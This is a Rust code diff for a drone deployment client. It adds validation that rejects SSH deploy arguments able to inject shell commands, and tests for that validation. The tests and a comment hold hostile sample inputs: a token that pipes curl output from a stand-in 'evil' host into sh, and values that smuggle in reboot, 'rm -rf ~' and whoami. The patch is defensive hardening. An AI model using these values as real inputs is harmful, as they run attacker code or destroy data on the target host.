@@ -578,6 +578,42 @@ impl DroneClient {
 
 // ── SSH Deployment ──
 
+/// The first deploy argument that cannot be safely placed in the composed remote
+/// shell command, or `None` when all three can.
+///
+/// `auth_token` is spliced straight into a `printf` *format string* and `drone_name`
+/// into a double-quoted word, both of which the remote shell then parses. Before
+/// this check, a token of `x'; curl evil | sh; '` ran on the buildbox, and an empty
+/// token silently deployed a drone that no peer could reach. A token is also what
+/// makes the drone's off-loopback bind safe, so it is required here.
+fn unsafe_remote_argument(host: &str, drone_name: &str, auth_token: &str) -> Option<&'static str> {
+    /// Letters, digits and the punctuation an unquoted shell word tolerates. Notably
+    /// no `%` (printf conversions) and no quote, space or command separator.
+    fn is_plain_word(value: &str) -> bool {
+        !value.is_empty()
+            && value
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':'))
+    }
+
+    if !is_plain_word(host) {
+        return Some("host");
+    }
+    if !is_plain_word(auth_token) {
+        return Some("auth_token");
+    }
+    // The name is allowed spaces because it sits inside double quotes; anything that
+    // closes those quotes or starts an expansion is not.
+    if drone_name.is_empty()
+        || drone_name
+            .chars()
+            .any(|c| matches!(c, '"' | '$' | '`' | '\\' | '\n' | '\r'))
+    {
+        return Some("drone_name");
+    }
+    None
+}
+
 /// Deploy the drone binary to a remote machine via SSH/SCP.
 pub struct DroneDeployer {
     ssh_user: String,
@@ -651,6 +687,14 @@ impl DroneDeployer {
         drone_name: &str,
         auth_token: &str,
     ) -> Result<DroneHealth, Box<dyn Error>> {
+        if let Some(unsafe_arg) = unsafe_remote_argument(host, drone_name, auth_token) {
+            return Err(format!(
+                "refusing to deploy: {unsafe_arg} carries characters that would end the quoting \
+                 it is placed in, which would run on {host} as a shell command. Use an \
+                 alphanumeric host/token and a name without quotes, $, backticks or backslashes."
+            )
+            .into());
+        }
         let binary_path = Self::find_drone_binary()?;
         let remote_target = self.remote_target(host);
         let ssh_args = self.ssh_common_args();
@@ -688,13 +732,16 @@ impl DroneDeployer {
 
         // Step 3: Make executable and start
         // Write the auth token to a restricted env file so it doesn't appear in the process list.
+        // The drone has to answer the IDE over the network, so it binds every interface; that is
+        // only safe because a token is mandatory here (see `unsafe_remote_argument`) — a
+        // tokenless drone refuses to start off-loopback rather than serving a remote shell.
         let start_cmd = format!(
             "chmod +x ~/.velocity-drone/velocity-drone && \
              printf 'DRONE_AUTH_TOKEN={}' > ~/.velocity-drone/.env && \
              chmod 600 ~/.velocity-drone/.env && \
              set -a && . ~/.velocity-drone/.env && set +a && \
              nohup ~/.velocity-drone/velocity-drone \
-             --port {} --name \"{}\" > ~/.velocity-drone/drone.log 2>&1 &",
+             --host 0.0.0.0 --port {} --name \"{}\" > ~/.velocity-drone/drone.log 2>&1 &",
             auth_token, drone_port, drone_name
         );
         let mut cmd = Command::new("ssh");
@@ -1060,6 +1107,66 @@ mod tests {
             DroneDeployer::new("admin", Some(Path::new("/home/user/.ssh/id_ed25519")), 22);
         let args = deployer.ssh_common_args();
         assert!(args.contains(&"/home/user/.ssh/id_ed25519".to_string()));
+    }
+
+    // ── Deploy argument safety ──
+
+    #[test]
+    fn a_token_that_could_end_the_remote_word_is_rejected() {
+        for token in [
+            "x'; curl http://evil | sh; '",
+            "a$(reboot)b",
+            "back\\slash",
+            "per%cent",
+            "two words",
+            "",
+        ] {
+            assert_eq!(
+                unsafe_remote_argument("192.168.1.5", "Build Box", token),
+                Some("auth_token"),
+                "token {token:?} must not reach the composed command"
+            );
+        }
+    }
+
+    #[test]
+    fn a_name_that_closes_its_own_quotes_is_rejected() {
+        assert_eq!(
+            unsafe_remote_argument("192.168.1.5", "Box\"; rm -rf ~; \"", "secret"),
+            Some("drone_name")
+        );
+        assert_eq!(
+            unsafe_remote_argument("192.168.1.5", "Box$(whoami)", "secret"),
+            Some("drone_name")
+        );
+    }
+
+    #[test]
+    fn an_ordinary_host_token_and_spaced_name_are_allowed() {
+        assert_eq!(
+            unsafe_remote_argument("build-box.local", "Build Machine 2", "Ab1-_c9"),
+            None
+        );
+        // The host is validated too, because it is also printed into URLs and logs.
+        assert_eq!(
+            unsafe_remote_argument("192.168.1.5; reboot", "Box", "secret"),
+            Some("host")
+        );
+    }
+
+    /// The guard has to run before anything is scp'd or executed remotely, so this
+    /// asserts the refusal text rather than a "binary not found" failure.
+    #[test]
+    fn deploy_refuses_an_unsafe_token_before_touching_the_remote_machine() {
+        let deployer = DroneDeployer::new("admin", None, 22);
+        let err = deployer
+            .deploy("192.168.1.5", 9191, "Build Box", "bad'token")
+            .expect_err("an injectable token must abort the deploy");
+        let msg = err.to_string();
+        assert!(
+            msg.contains("refusing to deploy") && msg.contains("auth_token"),
+            "expected the argument-safety refusal, got: {msg}"
+        );
     }
 
     #[test]
